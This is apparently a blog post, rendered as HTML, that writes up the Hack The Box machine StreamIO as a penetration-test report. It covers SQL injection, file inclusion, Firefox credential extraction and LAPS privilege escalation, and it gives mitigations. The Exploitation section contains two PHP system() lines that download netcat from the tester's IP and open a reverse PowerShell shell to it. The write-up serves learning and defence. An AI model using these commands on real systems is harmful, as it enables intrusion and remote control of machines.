@@ -1,0 +1,261 @@
+<!doctype html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>StreamIO // Cyber security blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="blackcaesar0" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.4566c05e79be04e22fdb60fe026660a374366519139306a7223d2cab6fb660db.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="StreamIO">
+  <meta name="twitter:description" content="Penetration Testing Report - StreamIO.htb Prepared by: blackcaesar0/SYN
+1. Executive Summary Purpose The objective of this penetration test is to assess the security of StreamIO.htb, identifying vulnerabilities and potential attack vectors. The test covers SQL injection, file inclusion vulnerabilities, and privilege escalation.
+Scope Primary Targets: streamio.htb, watch.streamio.htb Testing Methodology: Enumeration → Vulnerability Analysis → Exploitation → Post-Exploitation → Reporting Key Findings SQL Injection in search.php allowing credential extraction. Remote File Inclusion (RFI) leading to command execution.">
+
+    <meta property="og:url" content="http://localhost:1313/hackthebox/streamio1/">
+  <meta property="og:site_name" content="Cyber security blog">
+  <meta property="og:title" content="StreamIO">
+  <meta property="og:description" content="Penetration Testing Report - StreamIO.htb Prepared by: blackcaesar0/SYN
+1. Executive Summary Purpose The objective of this penetration test is to assess the security of StreamIO.htb, identifying vulnerabilities and potential attack vectors. The test covers SQL injection, file inclusion vulnerabilities, and privilege escalation.
+Scope Primary Targets: streamio.htb, watch.streamio.htb Testing Methodology: Enumeration → Vulnerability Analysis → Exploitation → Post-Exploitation → Reporting Key Findings SQL Injection in search.php allowing credential extraction. Remote File Inclusion (RFI) leading to command execution.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hackthebox">
+    <meta property="article:published_time" content="2025-02-21T06:43:05+01:00">
+    <meta property="article:modified_time" content="2025-02-21T06:43:05+01:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="/"><img class="app-header-avatar" src="/avatar.jpg" alt="blackcaesar0" /></a>
+      <span class="app-header-title">blackcaesar0</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/hackthebox/">Hackthebox</a>
+      </nav>
+      <p>Exploring cybersecurity, ethical hacking, and digital forensics—one exploit at a time.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/blackcaesar0" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">StreamIO</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Feb 21, 2025
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="penetration-testing-report---streamiohtb">Penetration Testing Report - StreamIO.htb</h1>
+<p><strong>Prepared by:</strong> blackcaesar0/SYN</p>
+<hr>
+<h2 id="1-executive-summary">1. Executive Summary</h2>
+<h3 id="purpose">Purpose</h3>
+<p>The objective of this penetration test is to assess the security of <strong>StreamIO.htb</strong>, identifying vulnerabilities and potential attack vectors. The test covers SQL injection, file inclusion vulnerabilities, and privilege escalation.</p>
+<h3 id="scope">Scope</h3>
+<ul>
+<li><strong>Primary Targets:</strong> <code>streamio.htb</code>, <code>watch.streamio.htb</code></li>
+<li><strong>Testing Methodology:</strong> Enumeration → Vulnerability Analysis → Exploitation → Post-Exploitation → Reporting</li>
+</ul>
+<h3 id="key-findings">Key Findings</h3>
+<ul>
+<li><strong>SQL Injection</strong> in <code>search.php</code> allowing credential extraction.</li>
+<li><strong>Remote File Inclusion (RFI)</strong> leading to command execution.</li>
+<li><strong>Privilege Escalation</strong> via misconfigured LAPS and user enumeration.</li>
+<li><strong>Firefox Profile Credential Dumping</strong> allowing access to stored passwords.</li>
+</ul>
+<h3 id="recommendations">Recommendations</h3>
+<ul>
+<li>Implement parameterized queries to prevent SQL injection.</li>
+<li>Restrict file inclusions and validate user input.</li>
+<li>Review user permissions and LAPS configurations to prevent privilege escalation.</li>
+</ul>
+<hr>
+<h2 id="2-introduction">2. Introduction</h2>
+<h3 id="target-information">Target Information</h3>
+<ul>
+<li><strong>Domain:</strong> <code>streamio.htb</code></li>
+<li><strong>IP Address:</strong> 10.129.141.95</li>
+<li><strong>Operating System:</strong> Windows Server</li>
+</ul>
+<h3 id="rules-of-engagement">Rules of Engagement</h3>
+<ul>
+<li>No <strong>Denial of Service (DoS)</strong> or disruptive attacks.</li>
+<li>Testing is limited to the <strong>defined scope</strong>.</li>
+<li>Exploits must be controlled to avoid unintended service disruption.</li>
+</ul>
+<hr>
+<h2 id="3-methodology">3. Methodology</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p><strong>Tools &amp; Techniques Used:</strong></p>
+<ul>
+<li><code>nmap</code>, <code>wfuzz</code> for directory and vhost enumeration.</li>
+</ul>
+<p><strong>Findings:</strong></p>
+<ul>
+<li>Discovered <strong>subdomains</strong>: <code>watch.streamio.htb</code>, <code>streamio.htb</code>.</li>
+<li>Enumerated directories and parameters, identifying potential vulnerabilities.</li>
+</ul>
+<p><img src="/static/streamio/dir_fuzzing.png" alt="Screenshot">
+<img src="/static/streamio/admin_dir_fuzzing.png" alt="Screenshot">
+<img src="/static/streamio/parameter_fuzzing.png" alt="Screenshot"></p>
+<h3 id="vulnerability-analysis">Vulnerability Analysis</h3>
+<p><strong>Tools &amp; Techniques Used:</strong></p>
+<ul>
+<li>Burp Suite, <code>wfuzz</code> for parameter fuzzing, manual code review.</li>
+</ul>
+<p><strong>Findings:</strong></p>
+<ul>
+<li><strong>SQL Injection (SQLi)</strong> in <code>search.php</code> enabled credential dumping.</li>
+<li><strong>Local File Inclusion (LFI)</strong> via the <code>debug</code> parameter allowed source code access.</li>
+<li><strong>Remote File Inclusion (RFI)</strong> enabled arbitrary file execution.</li>
+</ul>
+<p><img src="/static/streamio/sql_injection.png" alt="Screenshot">
+<img src="/static/streamio/sql_injection_password_dump.png" alt="Screenshot">
+<img src="/static/streamio/password_hash_cracking.png" alt="Screenshot">
+<img src="/static/streamio/master_php_source_code.png" alt="Screenshot"></p>
+<h3 id="exploitation">Exploitation</h3>
+<p><strong>Tools &amp; Techniques Used:</strong></p>
+<ul>
+<li>Burp Suite, RFI exploitation, remote shell execution.</li>
+</ul>
+<p><strong>Findings:</strong></p>
+<ul>
+<li><strong>SQL Injection</strong> allowed retrieval of database credentials.</li>
+<li><strong>RFI vulnerability</strong> led to reverse shell execution:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;powershell -c wget 10.10.14.161/nc64.exe -outfile C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">programdata</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">nc64.exe&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">programdata</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">nc64.exe -e powershell 10.10.14.161 4443&#34;</span>);
+</span></span></code></pre></div></li>
+<li><strong>Gained initial access</strong> as <code>yoshihide</code>.</li>
+</ul>
+<p><img src="/static/streamio/command_execution.png" alt="Screenshot">
+<img src="/static/streamio/FI_file_download.png" alt="Screenshot">
+<img src="/static/streamio/rev_shell.png" alt="Screenshot"></p>
+<h3 id="post-exploitation">Post-Exploitation</h3>
+<p><strong>Tools &amp; Techniques Used:</strong></p>
+<ul>
+<li>Evil-WinRM, BloodHound, <code>firefox_decrypt</code>.</li>
+</ul>
+<p><strong>Findings:</strong></p>
+<ul>
+<li>Extracted <strong>database credentials</strong> from <code>inetpub/streamio.htb/admin/index.php</code>.</li>
+<li>Dumped additional credentials from <strong>backup_streamio</strong>.</li>
+<li>Found <strong>Firefox profiles</strong> and extracted stored credentials using <code>firefox_decrypt</code>.</li>
+<li><strong>BloodHound analysis</strong> revealed <code>jdgodd</code> had <code>WriteOwner</code> on the <code>core staff</code> group, which could read <strong>LAPS passwords</strong>.</li>
+<li><strong>Privilege escalation</strong> via LAPS misconfiguration, gaining administrative access.
+<img src="/static/streamio/source_code_of_master_php.png" alt="Screenshot">
+<img src="/static/streamio/database_backup_password_dump.png" alt="Screenshot">
+<img src="/static/streamio/database_backup_password_hash_cracking.png" alt="Screenshot">
+<img src="/static/streamio/user_access.png" alt="Screenshot">
+<img src="/static/streamio/firefox_login_passwords.png" alt="Screenshot">
+<img src="/static/streamio/firefox_login_creds_dump.png" alt="Screenshot">
+<img src="/static/streamio/bloodhound_data_collection.png" alt="Screenshot">
+<img src="/static/streamio/graph_enum.png" alt="Screenshot">
+<img src="/static/streamio/writeowner.png" alt="Screenshot">
+<img src="/static/streamio/adding_jdgodd_to_core_staff.png" alt="Screenshot">
+<img src="/static/streamio/reading_laps.png" alt="Screenshot"></li>
+</ul>
+<hr>
+<h2 id="4-findings">4. Findings</h2>
+<h3 id="vulnerability-1-sql-injection-sqli-in-searchphp">Vulnerability 1: SQL Injection (SQLi) in <code>search.php</code></h3>
+<ul>
+<li><strong>Impact:</strong> Unauthorized database access, credential dumping.</li>
+<li><strong>Risk Level:</strong> High</li>
+<li><strong>Mitigation:</strong> Implement parameterized queries, sanitize input.</li>
+</ul>
+<h3 id="vulnerability-2-local-file-inclusion-lfi-via-debug-parameter">Vulnerability 2: Local File Inclusion (LFI) via <code>debug</code> Parameter</h3>
+<ul>
+<li><strong>Impact:</strong> Allowed access to sensitive source code.</li>
+<li><strong>Risk Level:</strong> High</li>
+<li><strong>Mitigation:</strong> Restrict user input, use allowlisted file paths.</li>
+</ul>
+<h3 id="vulnerability-3-remote-file-inclusion-rfi">Vulnerability 3: Remote File Inclusion (RFI)</h3>
+<ul>
+<li><strong>Impact:</strong> Enabled execution of arbitrary remote files.</li>
+<li><strong>Risk Level:</strong> Critical</li>
+<li><strong>Mitigation:</strong> Disable remote file inclusion, implement input validation.</li>
+</ul>
+<h3 id="vulnerability-4-reverse-shell-via-rfi">Vulnerability 4: Reverse Shell via RFI</h3>
+<ul>
+<li><strong>Impact:</strong> Full system compromise.</li>
+<li><strong>Risk Level:</strong> Critical</li>
+<li><strong>Mitigation:</strong> Restrict file inclusions, apply principle of least privilege.</li>
+</ul>
+<h3 id="vulnerability-5-firefox-profile-credential-dumping">Vulnerability 5: Firefox Profile Credential Dumping</h3>
+<ul>
+<li><strong>Impact:</strong> Access to stored passwords in the Firefox profile.</li>
+<li><strong>Risk Level:</strong> Medium</li>
+<li><strong>Mitigation:</strong> Use encrypted password storage, enforce MFA.</li>
+</ul>
+<h3 id="vulnerability-6-privilege-escalation-via-laps-misconfiguration">Vulnerability 6: Privilege Escalation via LAPS Misconfiguration</h3>
+<ul>
+<li><strong>Impact:</strong> Allowed retrieval of administrator credentials.</li>
+<li><strong>Risk Level:</strong> Critical</li>
+<li><strong>Mitigation:</strong> Restrict LAPS read permissions, monitor privilege assignments.</li>
+</ul>
+<hr>
+<h2 id="5-recommendations">5. Recommendations</h2>
+<h3 id="general-security-improvements">General Security Improvements</h3>
+<ul>
+<li><strong>SQL Injection Mitigation:</strong> Implement parameterized queries, sanitize user inputs.</li>
+<li><strong>File Inclusion Protection:</strong> Restrict remote and local file inclusions, use allowlists.</li>
+<li><strong>Least Privilege Enforcement:</strong> Regularly audit and restrict access rights.</li>
+<li><strong>LAPS Security Hardening:</strong> Ensure only authorized accounts can read LAPS credentials.</li>
+<li><strong>Credential Storage:</strong> Use secure password managers instead of browser storage.</li>
+</ul>
+<h3 id="logging--monitoring">Logging &amp; Monitoring</h3>
+<ul>
+<li><strong>Enable centralized logging</strong> to detect suspicious activities.</li>
+<li><strong>Monitor authentication logs</strong> for unusual login attempts.</li>
+<li><strong>Set up intrusion detection</strong> for SQL injection, file inclusion.</li>
+</ul>
+<h3 id="patching--hardening">Patching &amp; Hardening</h3>
+<ul>
+<li><strong>Update web application components</strong> to mitigate known vulnerabilities.</li>
+<li><strong>Conduct regular security assessments</strong> to identify emerging threats.</li>
+</ul>
+<hr>
+<h2 id="6-conclusion">6. Conclusion</h2>
+<p>The assessment of <strong>StreamIO.htb</strong> revealed multiple critical security vulnerabilities, including <strong>SQL injection, RFI, and LAPS misconfigurations</strong>, which were successfully exploited to gain administrative access.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
